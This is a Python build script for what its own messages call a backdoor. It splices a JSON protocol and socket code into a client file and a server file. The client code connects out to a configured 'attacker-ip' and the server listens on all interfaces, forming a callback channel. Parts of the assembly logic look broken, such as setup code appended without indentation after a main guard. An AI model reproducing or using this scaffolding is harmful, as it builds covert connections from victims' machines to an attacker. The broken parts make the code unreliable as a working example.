import os
import ast


SETUP_CODE_FOR_CLIENT = """
import socket
import json

protocol = json.loads(___INSERTED_PROTOCOL___)
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((protocol.get("attacker-ip"), protocol.get("acceptable-ports")[0]))
socket.send("hi".encode())
socket.close()
"""

SETUP_CODE_FOR_SERVER = """
import socket
import json

protocol = json.loads(___INSERTED_PROTOCOL___)
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(("0.0.0.0", protocol.get("acceptable-ports")[0]))
socket.listen(1)
connection, address = socket.accept()
print("Connection from", address)
data = connection.recv(1024)
print(data.decode())
connection.close()
"""





def paste_protocol(file, mode):
	"""
	Modifies the given file to include the protocol.
	"""
	# first, find the protocol.json file
	if not "protocol.json" in os.listdir():
		print("Error: protocol.json not found.")
		return
	
	# now copy the file to a new file
	new_file_name = ""
	if mode == "client":
		new_file_name = "___build_candidate__client___.py"
	else:
		new_file_name = "___build_candidate__server___.py"
	
	new_file_contents = ""
	protocol = ""
	with open("protocol.json", "r") as f: protocol = f.read()


	with open(new_file_name, "w") as f:
		tree = ast.parse(file[1])
		for node in ast.walk(tree):
			if isinstance(node, ast.FunctionDef):
				# check if the function is main, if it is we want to split the file just before 'def main():'
				if node.name == "main":
					char_counter = 0
					line_counter = 0
					for char in file[1]:
						if line_counter == node.lineno-1:
							break
						if char == "\n":
							line_counter += 1
						char_counter += 1
					new_file_contents = file[1][:char_counter]
					new_file_contents += f"___INSERTED_PROTOCOL___ = \"\"\"\n{protocol}\n\"\"\"\n\n"
					new_file_contents += f"if __name__ == \"__main__\":\n"
					f.write(new_file_contents)
					break

def paste_setup(file, mode):
	"""
	Modifies the given file to include the setup code.
	"""
	new_file_name = ""
	if mode == "client":
		new_file_name = "___build_candidate__client___.py"
	else:
		new_file_name = "___build_candidate__server___.py"
	
	new_file_contents = ""
	with open(new_file_name, "a") as f:
		tree = ast.parse(file[1])
		for node in ast.walk(tree):
			if isinstance(node, ast.FunctionDef):
				# check if the function is main, if it is we want to split the file just before 'def main():'
				if node.name == "main":
					if mode == "client":
						f.write(SETUP_CODE_FOR_CLIENT)
					else:
						f.write(SETUP_CODE_FOR_SERVER)
					break

def handle_client(client_file):
	paste_protocol(client_file, "client")
	paste_setup(client_file, "client")

def handle_server(server_file):
	paste_protocol(server_file, "server")
	paste_setup(server_file, "server")

def handle_setup(mode):
	pass

def get_file_content():
	file_names = [file_name for file_name in os.listdir() if os.path.isfile(file_name) and file_name != "build.py"]
	return [(file_name,open(file_name, "r").read()) for file_name in file_names if file_name.endswith(".py")]

def get_files_to_modify(files):
	files_to_modify = []
	for file in files:
		tree = ast.parse(file[1])
		for node in ast.walk(tree):
			if isinstance(node, ast.Import):
				for alias in node.names:
					if alias.name == __name__:
						files_to_modify.append(file)
	return files_to_modify

def check_main_function_declared(files_to_modify):
	do_have_main_declared = [False, False]
	for i, file in enumerate(files_to_modify):
		tree = ast.parse(file[1])
		do_have_main_declared[i] = any(
			node.name == "main" for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)
		)
	return all(do_have_main_declared)

def check_main_function_called(files_to_modify):
	for file in files_to_modify:
		tree = ast.parse(file[1])
		if any(
			node.func.id == "main" for node in ast.walk(tree) 
			if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
		):
			return False
	return True

def determine_files(files_to_modify):
	backdoor_file = None
	server_file = None
	for file in files_to_modify:
		tree = ast.parse(file[1])
		for node in ast.walk(tree):
			if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
				if node.func.attr == "handle_setup" and node.func.value.id == __name__:
					if node.args[0].s == "client":
						backdoor_file = file
					else:
						server_file = file
	return backdoor_file, server_file

def build():
	files = get_file_content()
	if len(files) != 2:
		print("Error: There must be exactly one backdoor file and one server file.")
		return

	files_to_modify = get_files_to_modify(files)
	if not check_main_function_declared(files_to_modify):
		print("Error: Both files must have a main function declared.")
		return 
	if not check_main_function_called(files_to_modify):
		print("Error: The main function must not be called.")
		return

	backdoor_file, server_file = determine_files(files_to_modify)

	handle_client(backdoor_file)
	handle_server(server_file)